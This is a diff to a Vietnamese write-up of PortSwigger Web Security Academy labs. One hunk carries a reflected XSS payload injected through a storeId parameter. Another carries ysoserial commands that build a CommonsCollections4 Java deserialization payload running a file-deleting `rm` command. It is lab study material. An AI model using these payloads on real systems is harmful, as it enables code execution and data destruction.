@@ -32,7 +32,7 @@ Nhập ngẫu nhiên input ta thấy hiển thị input ở dưới:
 
 ![alt text](image-1.png)
 
-Payload: `</select><img src=1 onerror=alert(1)>`
+Payload: `https://0a0d00a9038212d682c1420900a50070.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E`
 
 ## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
@@ -408,10 +408,10 @@ Tạo payload:
 
 Dùng lệnh `wsl` để mở ubuntu rồi chạy 1 trong 2 lệnh (nếu lệnh 1 lỗi):
 
-- `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`
+- `java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`
 
 
-- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`
+- `java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > text.txt`
 
 copy rồi encode về URL encode
 
